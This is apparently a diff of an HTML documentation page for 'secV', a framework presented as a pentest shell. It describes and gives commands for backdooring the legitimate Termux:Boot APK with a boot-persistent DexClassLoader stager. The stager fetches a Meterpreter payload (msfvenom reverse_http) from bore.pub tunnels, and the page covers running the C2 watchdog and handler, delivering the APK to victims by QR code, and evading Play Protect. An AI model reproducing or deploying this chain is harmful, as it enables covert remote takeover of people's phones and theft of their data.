-        Every value the user sets with <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">set</code>
-        is stored in the shell's in-memory param map. When <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">run</code>
-        is called the shell serialises the map plus the target into a single JSON object
-        and writes it to the module's stdin. The module reads one line, parses it, and proceeds.
-      </div>
+      <div class="info-card-body">Every value the user sets with <code>set</code> is stored in the shell's in-memory param map. When <code>run</code> is called the shell serialises the map plus the target into a single JSON object and writes it to the module's stdin.</div>
     </div>
-    <div class="info-card">
+    <div class="info-card reveal">
       <div class="info-card-num">03</div>
       <div class="info-card-title">Output Contract</div>
-      <div class="info-card-body">
-        Modules write UTF-8 lines to stdout. Lines that start with
-        <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">FINDING:</code> are parsed as JSON findings.
-        Lines starting with <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">LOG:</code> become log entries.
-        Everything else is streamed directly to the terminal as progress output.
-        When the process exits the shell collects all findings and renders a summary table.
-      </div>
+      <div class="info-card-body">Modules write UTF-8 lines to stdout. Lines starting with <code>FINDING:</code> are parsed as JSON findings. Lines starting with <code>LOG:</code> become log entries. Everything else streams directly to the terminal as progress output.</div>
     </div>
-    <div class="info-card">
+    <div class="info-card reveal">
       <div class="info-card-num">04</div>
       <div class="info-card-title">Session Tracking</div>
-      <div class="info-card-body">
-        The shell maintains a live session registry. Meterpreter sessions opened through
-        android_pentest are tracked by PID and metadata. Use
-        <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">sessions list</code> to view,
-        <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">sessions interact &lt;id&gt;</code>
-        to drop into a session, or <code style="font-size:0.64rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.25rem">sessions kill &lt;id&gt;</code> to terminate it.
-      </div>
+      <div class="info-card-body">The shell maintains a live session registry. Meterpreter sessions opened through android_pentest are tracked by PID and metadata. Use <code>sessions list</code>, <code>sessions interact &lt;id&gt;</code>, or <code>sessions kill &lt;id&gt;</code>.</div>
     </div>
   </div>
 
   <h3>Directory Layout</h3>
-  <p class="body-text">
-    The repository follows a consistent structure. The Go shell binary lives at the root.
-    All modules live under <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">tools/</code>,
-    grouped by category. Each module folder contains a <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">module.json</code>
-    and one or more Python scripts.
-  </p>
-  <pre><code><span class="hl">secV/</span>
+  <p class="body-text reveal">The repository follows a consistent structure. The Go shell binary lives at the root. All modules live under <code style="font-size:0.7rem;color:var(--ash);background:var(--slab);border:1px solid var(--wall);padding:0.04rem 0.28rem;border-radius:3px">tools/</code>, grouped by category. Each module folder contains a <code style="font-size:0.7rem;color:var(--ash);background:var(--slab);border:1px solid var(--wall);padding:0.04rem 0.28rem;border-radius:3px">module.json</code> and one or more Python scripts.</p>
+<pre class="reveal"><code><span class="hl">secV/</span>
 ├── <span class="kw">secV</span>                       <span class="cm"># compiled Go REPL binary</span>
 ├── <span class="kw">main.go</span>                    <span class="cm"># shell source - REPL loop, command parser, module loader</span>
 ├── install.sh                 <span class="cm"># dependency installer + binary builder</span>
@@ -1186,39 +1058,33 @@ footer {
 │   │       ├── <span class="st">module.json</span>
 │   │       ├── android_pentest.py
 │   │       ├── apk_backdoor/
-│   │       │   ├── build_bootbuddy.py   <span class="cm"># APK patcher + QR delivery</span>
+│   │       │   ├── build_bootbuddy.py
 │   │       │   ├── AgentService.smali
-│   │       │   └── output/              <span class="cm"># rebuilt.apk  s.dex  apk_delivery.png</span>
+│   │       │   └── output/
 │   │       └── c2_persistence/
-│   │           ├── c2_watchdog.sh       <span class="cm"># bore tunnels + MSF + DEX server</span>
+│   │           ├── c2_watchdog.sh
 │   │           └── secv-c2.service
 │   └── web/
 │       └── webscan/
 └── gen_module.py              <span class="cm"># scaffold a new module interactively</span></code></pre>
-
 </div>
 
 <hr class="rule">
 
-<!-- Internals -->
+<!-- INTERNALS -->
 <div class="wrap" id="internals">
-  <p class="section-label">Code Deep Dive</p>
-  <h2>Internals</h2>
+  <div class="section-label">
+    <span class="section-num">03</span>
+    <span>Code Deep Dive</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Inter<span class="h2-stroke">nals</span></h2>
 
-  <p class="body-text">
-    This section explains how the key pieces of secV work at the code level.
-    It is intended for people who want to understand, extend, or audit the framework -
-    not just use it.
-  </p>
+  <p class="body-text reveal">This section explains how the key pieces of secV work at the code level. It is intended for people who want to understand, extend, or audit the framework — not just use it.</p>
 
   <h3>The REPL Loop (main.go)</h3>
-  <p class="body-text">
-    The shell is a standard Go read-eval-print loop. On each iteration it prints a prompt,
-    reads a line, tokenises it, and dispatches to a handler. The prompt is built dynamically:
-    it shows the loaded module name and the count of currently-set parameters so you always
-    know your context at a glance.
-  </p>
-  <pre><code><span class="cm">// Simplified prompt construction - actual code in main.go</span>
+  <p class="body-text reveal">The shell is a standard Go read-eval-print loop. On each iteration it prints a prompt, reads a line, tokenises it, and dispatches to a handler. The prompt is built dynamically: it shows the loaded module name and count of currently-set parameters so you always know your context at a glance.</p>
+<pre class="reveal"><code><span class="cm">// Simplified prompt construction - actual code in main.go</span>
 <span class="kw">func</span> buildPrompt(mod *Module, params map[string]string) string {
     <span class="kw">if</span> mod == nil {
         <span class="kw">return</span> <span class="st">"secV ❯ "</span>
@@ -1231,37 +1097,20 @@ footer {
     <span class="kw">return</span> fmt.Sprintf(<span class="st">"secV %s ❯ "</span>, mod.Name)
 }</code></pre>
 
-  <p class="body-text">
-    Built-in commands (<code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">use</code>,
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">set</code>,
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">run</code>,
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">back</code> etc.) are matched first.
-    If no built-in matches, the shell checks whether the first token is a Linux binary
-    (via <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">exec.LookPath</code>) and executes it
-    as a subprocess - this is how native Linux commands like <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">ls</code>,
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">cat</code>, and <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">grep</code> work natively
-    from inside secV without any special handling.
-  </p>
-
   <h3>Module Loading (module.json)</h3>
-  <p class="body-text">
-    Every module directory contains a <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">module.json</code>
-    that the shell reads at startup (and on <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">reload</code>).
-    The JSON defines everything the shell needs to know about the module - no code is
-    executed at load time.
-  </p>
-  <pre><code><span class="cm">// Example module.json (android_pentest, abbreviated)</span>
+  <p class="body-text reveal">Every module directory contains a <code style="font-size:0.7rem;color:var(--ash);background:var(--slab);border:1px solid var(--wall);padding:0.04rem 0.28rem;border-radius:3px">module.json</code> that the shell reads at startup (and on <code style="font-size:0.7rem;color:var(--ash);background:var(--slab);border:1px solid var(--wall);padding:0.04rem 0.28rem;border-radius:3px">reload</code>). The JSON defines everything the shell needs to know about the module — no code is executed at load time.</p>
+<pre class="reveal"><code><span class="cm">// Example module.json (android_pentest, abbreviated)</span>
 {
   <span class="st">"name"</span>:        <span class="st">"android_pentest"</span>,
   <span class="st">"version"</span>:     <span class="st">"2.0"</span>,
   <span class="st">"description"</span>: <span class="st">"Android security testing suite"</span>,
-  <span class="st">"entry"</span>:       <span class="st">"android_pentest.py"</span>,    <span class="cm">// script the shell invokes</span>
+  <span class="st">"entry"</span>:       <span class="st">"android_pentest.py"</span>,
   <span class="st">"author"</span>:      <span class="st">"0xb0rn3"</span>,
   <span class="st">"parameters"</span>: {
     <span class="st">"operation"</span>: {
       <span class="st">"type"</span>:     <span class="st">"string"</span>,
       <span class="st">"required"</span>: true,
-      <span class="st">"options"</span>:  [<span class="st">"recon"</span>, <span class="st">"static_analysis"</span>, <span class="st">"backdoor_apk"</span>, <span class="st">"rebuild"</span>, ...],
+      <span class="st">"options"</span>:  [<span class="st">"recon"</span>, <span class="st">"static_analysis"</span>, <span class="st">"backdoor_apk"</span>, <span class="st">"rebuild"</span>],
       <span class="st">"help"</span>:     <span class="st">"Operation to perform"</span>
     },
     <span class="st">"msf"</span>: {
@@ -1270,32 +1119,16 @@ footer {
       <span class="st">"default"</span>:  false,
       <span class="st">"help"</span>:     <span class="st">"Inject DexClassLoader Meterpreter payload"</span>
     }
-    <span class="cm">// ... more params</span>
   },
   <span class="st">"dependencies"</span>: [<span class="st">"adb"</span>, <span class="st">"apktool"</span>, <span class="st">"java"</span>, <span class="st">"msfvenom"</span>]
 }</code></pre>
 
-  <p class="body-text">
-    When the user runs <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">use android_pentest</code>
-    the shell reads this JSON, builds the tab-completion candidates from the
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">parameters</code> map and each parameter's
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">options</code> list, and checks whether all
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">dependencies</code> are on PATH.
-    Nothing is executed yet.
-  </p>
-
   <h3>The stdin/stdout Protocol</h3>
-  <p class="body-text">
-    When the user calls <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">run &lt;target&gt;</code>
-    the shell spawns the entry-point script as a subprocess, writes a single JSON line to
-    its stdin, and then streams the subprocess's stdout directly to the terminal.
-    The module reads the JSON, executes the requested operation, and emits findings.
-  </p>
-  <div class="two-col">
+  <div class="two-col reveal">
     <div class="col-card">
       <div class="col-card-title">Shell → Module (stdin)</div>
       <div class="col-card-body">
-<pre style="margin:0;border:none;background:none;padding:0;font-size:0.68rem">{
+<pre style="margin:0;border:none;background:none;padding:0;font-size:0.66rem;border-radius:0">{
   <span class="st">"target"</span>: <span class="st">"192.168.1.1"</span>,
   <span class="st">"params"</span>: {
     <span class="st">"operation"</span>: <span class="st">"recon"</span>,
@@ -1308,30 +1141,22 @@ footer {
     <div class="col-card">
       <div class="col-card-title">Module → Shell (stdout)</div>
       <div class="col-card-body">
-<pre style="margin:0;border:none;background:none;padding:0;font-size:0.68rem"><span class="cm"># Progress lines go straight to terminal</span>
+<pre style="margin:0;border:none;background:none;padding:0;font-size:0.66rem;border-radius:0"><span class="cm"># Progress → terminal</span>
 [*] Scanning 192.168.1.1...
 [+] Port 22 open - OpenSSH 8.9
 
-<span class="cm"># Findings lines parsed by shell</span>
+<span class="cm"># Findings → parsed by shell</span>
 FINDING: {"category":"open_port",
-          "port":22,"service":"ssh",
-          "version":"OpenSSH 8.9"}
+          "port":22,"service":"ssh"}
 
-<span class="cm"># Log lines stored in session</span>
+<span class="cm"># Logs → stored in session</span>
 LOG: scan completed in 4.2s</pre>
       </div>
     </div>
   </div>
 
   <h3>How a Python Module Receives Data</h3>
-  <p class="body-text">
-    Every Python module starts with the same boilerplate: read one JSON line from stdin,
-    extract <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">target</code> and
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">params</code>, dispatch to the requested operation,
-    and print findings. The findings are plain Python dictionaries serialised to JSON and
-    prefixed with <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">FINDING:</code>.
-  </p>
-  <pre><code><span class="kw">import</span> json, sys
+<pre class="reveal"><code><span class="kw">import</span> json, sys
 
 <span class="cm"># Read the shell's dispatch payload</span>
 data   = json.loads(sys.stdin.readline())
@@ -1339,223 +1164,97 @@ target = data.get(<span class="st">"target"</span>, <span class="st">""</span>)
 params = data.get(<span class="st">"params"</span>, {})
 op     = params.get(<span class="st">"operation"</span>, <span class="st">"recon"</span>)
 
-<span class="cm"># Dispatch table - each operation is its own method</span>
+<span class="cm"># Dispatch table</span>
 ops = {
-    <span class="st">"recon"</span>:          self._recon_operation,
+    <span class="st">"recon"</span>:           self._recon_operation,
     <span class="st">"static_analysis"</span>: self._static_analysis_operation,
-    <span class="st">"backdoor_apk"</span>:   self._backdoor_apk_operation,
-    <span class="st">"rebuild"</span>:         self._rebuild_apk_operation,
+    <span class="st">"backdoor_apk"</span>:    self._backdoor_apk_operation,
 }
 
 handler = ops.get(op)
 <span class="kw">if</span> handler:
     handler()
-<span class="kw">else</span>:
-    print(<span class="st">f"[!] Unknown operation: {op}"</span>)
 
 <span class="cm"># Emit all collected findings</span>
 <span class="kw">for</span> f <span class="kw">in</span> self.findings:
     print(<span class="st">f"FINDING: {json.dumps(f)}"</span>)</code></pre>
-
-  <h3>Operation Dispatch in android_pentest</h3>
-  <p class="body-text">
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">android_pentest.py</code> exposes 26 operations, each mapped to a private method.
-    Operations are grouped by purpose - recon, analysis, exploitation, persistence, and delivery.
-    The method naming convention is always <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">_&lt;operation_name&gt;_operation(self)</code>.
-    All shared state (device info, findings list, errors, log lines) lives on the
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">AndroidPentest</code> class instance.
-  </p>
-  <pre><code><span class="cm"># android_pentest.py - operation registry (simplified)</span>
-_OPS = {
-    <span class="st">"recon"</span>:               <span class="st"># ADB device fingerprint, OS, arch, root status</span>
-    <span class="st">"static_analysis"</span>:    <span class="st"># pull APK → apktool → jadx → secret scan</span>
-    <span class="st">"permissions_audit"</span>:  <span class="st"># parse dumpsys → flag dangerous permissions</span>
-    <span class="st">"backdoor_apk"</span>:       <span class="st"># smali patch → sign → push</span>
-    <span class="st">"rebuild"</span>:             <span class="st"># build_bootbuddy.py → DexClassLoader APK + QR</span>
-    <span class="st">"frida_attach"</span>:       <span class="st"># spawn frida-server → attach to PID</span>
-    <span class="st">"ssl_bypass"</span>:         <span class="st"># objection SSL pinning disable</span>
-    <span class="st">"logcat_leak"</span>:        <span class="st"># read logcat → grep secrets, tokens, credentials</span>
-    <span class="st">"content_provider"</span>:   <span class="st"># enumerate exported providers → SQL injection test</span>
-    <span class="st">"network_capture"</span>:    <span class="st"># tcpdump via root → pcap to attacker</span>
-    <span class="st">"qr_exploit"</span>:         <span class="st"># generate QR for APK URL delivery</span>
-    <span class="cm">// ... 15 more operations</span>
-}</code></pre>
-
-  <h3>The ADB Bridge</h3>
-  <p class="body-text">
-    Most android_pentest operations route through the same internal ADB helper.
-    It wraps <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">subprocess.run(["adb", ...], capture_output=True)</code>
-    and parses the output. Device discovery runs automatically before any operation
-    that requires a connected device - if no device is found, the operation
-    fails with a clear error rather than silently producing garbage output.
-  </p>
-  <pre><code><span class="kw">def</span> _adb(self, *args) -> subprocess.CompletedProcess:
-    cmd = [<span class="st">"adb"</span>]
-    <span class="kw">if</span> self.device_serial:
-        cmd += [<span class="st">"-s"</span>, self.device_serial]
-    cmd += list(args)
-    <span class="kw">return</span> subprocess.run(cmd, capture_output=True, text=True, timeout=30)
-
-<span class="kw">def</span> _shell(self, *cmd) -> str:
-    r = self._adb(<span class="st">"shell"</span>, *cmd)
-    <span class="kw">return</span> r.stdout.strip()
-
-<span class="cm"># Usage inside an operation:</span>
-arch = self._shell(<span class="st">"getprop ro.product.cpu.abi"</span>)
-sdk  = self._shell(<span class="st">"getprop ro.build.version.sdk"</span>)</code></pre>
-
 </div>
 
 <hr class="rule">
 
-<!-- C2 Stack -->
+<!-- C2 STACK -->
 <div class="wrap" id="c2stack">
-  <p class="section-label">Android C2</p>
-  <h2>C2 Stack &amp; APK Persistence</h2>
+  <div class="section-label">
+    <span class="section-num">04</span>
+    <span>Android C2</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>C2 Stack &amp;<br><span class="h2-stroke">APK Persistence</span></h2>
 
-  <p class="body-text">
-    The Android persistence chain is the most technically complex part of secV.
-    It uses several layered techniques to achieve boot-persistent Meterpreter sessions
-    over WAN without embedding any detectable payload statically in the APK.
-    This section documents every component of that chain - what it does, why it works,
-    and how each piece connects to the next.
-  </p>
+  <p class="body-text reveal">The Android persistence chain is the most technically complex part of secV. It uses several layered techniques to achieve boot-persistent Meterpreter sessions over WAN without embedding any detectable payload statically in the APK.</p>
 
-  <div class="callout">
-    <strong>Design goal:</strong> The rebuilt APK must pass Play Protect static analysis,
-    survive a device reboot, fetch the real Meterpreter payload from a WAN endpoint without
-    storing it on disk permanently, and open a session through carrier NAT.
+  <div class="callout reveal">
+    <strong>Design goal:</strong> The rebuilt APK must pass Play Protect static analysis, survive a device reboot, fetch the real Meterpreter payload from a WAN endpoint without storing it on disk permanently, and open a session through carrier NAT.
   </div>
 
   <h3>The Four-Layer Chain</h3>
 
-  <div class="chain">
+  <div class="chain reveal">
     <div class="chain-step">
       <div class="chain-num">01</div>
       <div>
         <div class="chain-content-title">Termux:Boot → BOOT_COMPLETED receiver</div>
-        <div class="chain-content-body">
-          The legitimate Termux:Boot APK is patched by
-          <span class="chain-content-code">build_bootbuddy.py</span>. The
-          <span class="chain-content-code">BootReceiver.onReceive()</span> smali is modified
-          to call <span class="chain-content-code">startForegroundService(AgentService)</span>
-          immediately on <span class="chain-content-code">BOOT_COMPLETED</span>.
-          The <span class="chain-content-code">exported="true"</span> flag is also set -
-          required on Android 11+ for the broadcast to be delivered.
-          A foreground service is necessary from API 26+ because background service starts
-          from broadcast receivers are blocked.
-        </div>
+        <div class="chain-content-body">The legitimate Termux:Boot APK is patched by <span class="chain-content-code">build_bootbuddy.py</span>. The <span class="chain-content-code">BootReceiver.onReceive()</span> smali is modified to call <span class="chain-content-code">startForegroundService(AgentService)</span> immediately on <span class="chain-content-code">BOOT_COMPLETED</span>. A foreground service is necessary from API 26+ because background service starts from broadcast receivers are blocked.</div>
       </div>
     </div>
     <div class="chain-step">
       <div class="chain-num">02</div>
       <div>
         <div class="chain-content-title">AgentService → foreground service context</div>
-        <div class="chain-content-body">
-          <span class="chain-content-code">AgentService.smali</span> is injected into the APK.
-          Its <span class="chain-content-code">onStartCommand()</span> creates a notification
-          channel (<span class="chain-content-code">"secv"</span>), calls
-          <span class="chain-content-code">startForeground()</span> to satisfy API 28+
-          foreground-service requirements, then invokes
-          <span class="chain-content-code">BootReceiver.launchAgent()</span>
-          (which starts the secV agent script from disk) and
-          <span class="chain-content-code">Payload.start(context)</span>
-          (which kicks off the DexClassLoader chain in a daemon thread).
-          Running inside a Service gives the payload a long-lived Android context - critical
-          because BroadcastReceivers are killed after ~10 seconds.
-        </div>
+        <div class="chain-content-body"><span class="chain-content-code">AgentService.smali</span> is injected into the APK. Its <span class="chain-content-code">onStartCommand()</span> creates a notification channel, calls <span class="chain-content-code">startForeground()</span> to satisfy API 28+ requirements, then invokes <span class="chain-content-code">BootReceiver.launchAgent()</span> and <span class="chain-content-code">Payload.start(context)</span> in a daemon thread.</div>
       </div>
     </div>
     <div class="chain-step">
       <div class="chain-num">03</div>
       <div>
         <div class="chain-content-title">DexClassLoader Payload → runtime DEX fetch</div>
-        <div class="chain-content-body">
-          <span class="chain-content-code">com.android.system.health.Payload</span> is injected
-          as a smali file by <span class="chain-content-code">gen_dexloader_smali()</span>.
-          Its <span class="chain-content-code">run()</span> method opens a URL connection to
-          <span class="chain-content-code">http://bore.pub:21062/s.dex</span>
-          (the URL is split across two string constants to avoid a single suspicious literal),
-          writes the bytes to <span class="chain-content-code">getCodeCacheDir()/s.dex</span>,
-          then loads it with <span class="chain-content-code">DexClassLoader</span> and calls
-          <span class="chain-content-code">com.metasploit.stage.Payload.start(context)</span>
-          via reflection. On failure it sleeps 5 seconds and retries indefinitely -
-          the session opens as soon as the device gets network after boot.
-          No Meterpreter code is ever present in the APK itself.
-        </div>
+        <div class="chain-content-body"><span class="chain-content-code">com.android.system.health.Payload</span> opens a URL connection to <span class="chain-content-code">http://bore.pub:21062/s.dex</span>, writes bytes to <span class="chain-content-code">getCodeCacheDir()/s.dex</span>, loads it with <span class="chain-content-code">DexClassLoader</span>, and calls <span class="chain-content-code">com.metasploit.stage.Payload.start(context)</span> via reflection. On failure it sleeps 5s and retries indefinitely.</div>
       </div>
     </div>
     <div class="chain-step">
       <div class="chain-num">04</div>
       <div>
         <div class="chain-content-title">s.dex → reverse_http Meterpreter via bore tunnel</div>
-        <div class="chain-content-body">
-          <span class="chain-content-code">s.dex</span> is generated by
-          <span class="chain-content-code">gen_sdex()</span> using
-          <span class="chain-content-code">msfvenom -p android/meterpreter/reverse_http</span>
-          targeting <span class="chain-content-code">bore.pub:37993</span> (the bore MSF tunnel).
-          <span class="chain-content-code">reverse_http</span> is chosen over
-          <span class="chain-content-code">reverse_tcp</span> because HTTP traffic survives
-          carrier NAT and DPI more reliably on mobile networks. The bore tunnel at
-          <span class="chain-content-code">bore.pub:37993</span> forwards to
-          <span class="chain-content-code">localhost:4444</span> on the attacker machine
-          where msfconsole (or the watchdog-managed handler) is listening.
-        </div>
+        <div class="chain-content-body"><span class="chain-content-code">s.dex</span> is generated by <span class="chain-content-code">msfvenom -p android/meterpreter/reverse_http</span> targeting <span class="chain-content-code">bore.pub:37993</span>. <span class="chain-content-code">reverse_http</span> survives carrier NAT and DPI more reliably on mobile networks than <span class="chain-content-code">reverse_tcp</span>.</div>
       </div>
     </div>
   </div>
 
-  <h3>c2_watchdog.sh - The Stack Manager</h3>
-  <p class="body-text">
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">c2_watchdog.sh</code>
-    manages four processes simultaneously and restarts any that die. It is the single command
-    needed on the attacker machine to bring up the entire C2 stack.
-  </p>
-
-  <div class="info-grid">
+  <h3>c2_watchdog.sh — The Stack Manager</h3>
+  <div class="info-grid reveal">
     <div class="info-card">
-      <div class="info-card-num" style="font-size:1rem">HTTP</div>
+      <div class="info-card-num">HTTP</div>
       <div class="info-card-title">DEX file server</div>
-      <div class="info-card-body">
-        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">python3 -m http.server 8080</code>
-        serving the <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">output/</code> directory.
-        Serves both <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">s.dex</code> (Meterpreter) and
-        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">rebuilt.apk</code> (QR delivery).
-      </div>
+      <div class="info-card-body"><code>python3 -m http.server 8080</code> serving the <code>output/</code> directory. Serves both <code>s.dex</code> and <code>rebuilt.apk</code>.</div>
     </div>
     <div class="info-card">
-      <div class="info-card-num" style="font-size:1rem">BORE</div>
+      <div class="info-card-num">BORE</div>
       <div class="info-card-title">DEX bore tunnel</div>
-      <div class="info-card-body">
-        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">bore local 8080 --to bore.pub --port 21062</code>
-        tunnels <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">bore.pub:21062</code> →
-        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">localhost:8080</code>.
-        The device's DexClassLoader fetches s.dex through this URL.
-      </div>
+      <div class="info-card-body"><code>bore local 8080 --to bore.pub --port 21062</code> — the device's DexClassLoader fetches s.dex through this URL.</div>
     </div>
     <div class="info-card">
-      <div class="info-card-num" style="font-size:1rem">BORE</div>
+      <div class="info-card-num">BORE</div>
       <div class="info-card-title">MSF bore tunnel</div>
-      <div class="info-card-body">
-        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">bore local 4444 --to bore.pub --port 37993</code>
-        tunnels <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">bore.pub:37993</code> →
-        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">localhost:4444</code>.
-        The Meterpreter in s.dex calls back through this tunnel.
-      </div>
+      <div class="info-card-body"><code>bore local 4444 --to bore.pub --port 37993</code> — the Meterpreter in s.dex calls back through this tunnel.</div>
     </div>
     <div class="info-card">
-      <div class="info-card-num" style="font-size:1rem">MSF</div>
+      <div class="info-card-num">MSF</div>
       <div class="info-card-title">msfconsole handler</div>
-      <div class="info-card-body">
-        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">msfconsole -q -r handler.rc</code> running
-        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">multi/handler</code> on
-        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">0.0.0.0:4444</code>
-        with payload <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">android/meterpreter/reverse_http</code>.
-      </div>
+      <div class="info-card-body"><code>msfconsole -q -r handler.rc</code> running <code>multi/handler</code> on <code>0.0.0.0:4444</code> with payload <code>android/meterpreter/reverse_http</code>.</div>
     </div>
   </div>
 
-  <pre><code><span class="cm"># Start the full C2 stack</span>
+  <pre class="reveal"><code><span class="cm"># Start the full C2 stack</span>
 bash tools/mobile/android/c2_persistence/c2_watchdog.sh \
   --bore-dex-port <span class="nu">21062</span> \
   --bore-msf-port <span class="nu">37993</span> \
@@ -1563,191 +1262,108 @@ bash tools/mobile/android/c2_persistence/c2_watchdog.sh \
   --dex-dir       tools/mobile/android/apk_backdoor/output/ \
   --notify
 
-<span class="cm"># Or as a systemd service (persistent across reboots)</span>
+<span class="cm"># Or as a systemd service</span>
 sudo systemctl enable --now secv-c2
 sudo journalctl -u secv-c2 -f</code></pre>
 
-  <h3>APK Delivery via QR</h3>
-  <p class="body-text">
-    After <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">build_bootbuddy.py</code> finishes building, it
-    automatically generates a QR code encoding the WAN APK URL
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">http://bore.pub:21062/rebuilt.apk</code>.
-    The APK is served by the same DEX HTTP server that the watchdog manages - the
-    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">output/</code> directory contains both files.
-    Once the watchdog is running, the target device only needs to scan the QR code with
-    any camera app, open the link, and install the APK. ADB is not required.
-  </p>
-
-  <pre><code><span class="cm"># QR is printed to terminal on every build</span>
-secV (android_pentest) › rebuild ❯ run device
-
-[+] Done.
-    Patched APK : output/rebuilt.apk
-    s.dex       : output/s.dex  (20348 bytes)
-
-    APK delivery URL:
-      http://bore.pub:21062/rebuilt.apk
-
-    ══════════════════════════════════════════════════════
-    SCAN TO INSTALL
-    ══════════════════════════════════════════════════════
-    █▀▀▀▀▀█  ▀▀█▄▀▀█ █▄ ▄ █▀▀▀▀▀█
-    █ ███ █ ▄▀██  █▄▀▄▀██ █ ███ █
-    ...
-    QR PNG saved: output/apk_delivery.png</code></pre>
-
   <h3>Play Protect Evasion</h3>
-  <p class="body-text">
-    Several specific decisions in the build chain exist to evade Play Protect and on-device
-    antivirus. These are worth understanding if you are tuning the chain or debugging
-    detection issues.
-  </p>
-
-  <div class="chain">
+  <div class="chain reveal">
     <div class="chain-step">
       <div class="chain-num">A</div>
       <div>
         <div class="chain-content-title">No static Meterpreter in APK</div>
-        <div class="chain-content-body">
-          The APK contains only the DexClassLoader fetcher - not the Meterpreter itself.
-          Play Protect's static DEX scanner finds nothing to flag because there are no
-          Metasploit signatures in the installed package. The real payload (s.dex) is
-          fetched at runtime and written to <span class="chain-content-code">getCodeCacheDir()</span>
-          which is not scanned by Play Protect during boot.
-        </div>
